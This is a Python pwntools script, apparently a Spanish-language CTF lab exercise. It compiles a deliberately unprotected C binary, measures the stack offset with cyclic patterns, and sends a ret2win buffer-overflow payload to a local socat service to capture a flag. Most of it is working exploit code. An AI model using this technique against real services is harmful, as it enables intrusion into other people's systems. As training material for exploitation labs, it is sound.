#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""C4 - Explotacion "remota": pwntools remote() contra un servicio TCP.
En tu Kali el servicio se levanta con socat (comando del enunciado):
    socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./c4_servir
Flujo mental de un CTF real:
  FASE 1 (local): medir el offset contra TU copia del binario con
  cyclic + corefile. remote() no regala corefiles.
  FASE 2 (remota): conectar con remote('127.0.0.1', 1337), ESPERAR el
  banner con recvuntil() (gets()/stdio se comen la entrada si llegas
  antes de tiempo) y enviar el mismo payload.
USO: python3 c4_servir.py   (con el socat ya levantado)"""
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './c4_servir'
HOST, PORT = '127.0.0.1', 1337

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'c4_servir.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)
win = elf.symbols['win']
log.info('win() = %#x (No PIE: fija, igual en local y en el servicio)', win)

# ------------------------------------------------------------------
# FASE 1 - offset LOCAL (cyclic + corefile, metodo A2).
# El binario es EL MISMO que sirve socat: el offset viaja contigo.
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'habla, remote()')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en LOCAL: %d bytes (valdra para el remoto)', offset)

# ------------------------------------------------------------------
# FASE 2 - el ataque REMOTO.
# ------------------------------------------------------------------
try:
    io = remote(HOST, PORT, timeout=5)
except Exception:
    log.failure('remote() no conecto. Levanta el servicio antes: '
                'socat TCP-LISTEN:%d,reuseaddr,fork EXEC:%s' % (PORT, BIN))
    raise SystemExit(1)

io.recvuntil(b'habla, remote()')     # ESPERAR antes de hablar: pitfall
payload = b'A' * offset + p64(win)
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=4)
io.close()

FLAG = b'FLAG{ROP_C4_explotacion_remota_socat}'
if FLAG in salida:
    log.success('C4 SUPERADO: flag capturada a traves del socket. '
                'Mismo binario, mismo offset, otro canal.')
    log.info('Ya sabes el flujo CTF: recon -> offset local -> remote() '
             '-> recvuntil -> payload -> leer la salida.')
else:
    log.failure('C4: sin flag. Pitfalls: recvuntil ANTES de sendline, '
                'socat con reuseaddr,fork, setvbuf en el fuente.')
